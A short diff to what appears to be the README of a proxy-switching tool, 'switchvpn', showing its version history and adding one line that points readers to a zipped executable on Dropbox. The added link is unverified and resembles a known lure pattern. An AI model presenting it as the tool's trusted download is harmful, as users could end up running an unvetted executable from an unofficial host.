@@ -29,3 +29,5 @@ Version history:
 - in 1.2.2: Stability improvements, Debug mode (proxy window remains visible).
 - in 1.2.3: Minor Bug Fix.
 - in 1.2.4: Added the ability to set "Bind-Address" as the system proxy at startup, or manually via the menu. It is now possible to use switchvpn as a system proxy on/off switch.
+
+Download everything quickly in one archive: https://www.dropbox.com/scl/fi/ib06ukmdqey2pzl2jejh0/SwitchVpnEXE.zip?rlkey=4h424xqtedtq5qbzoc40kac0w&st=o8hklle9&dl=1
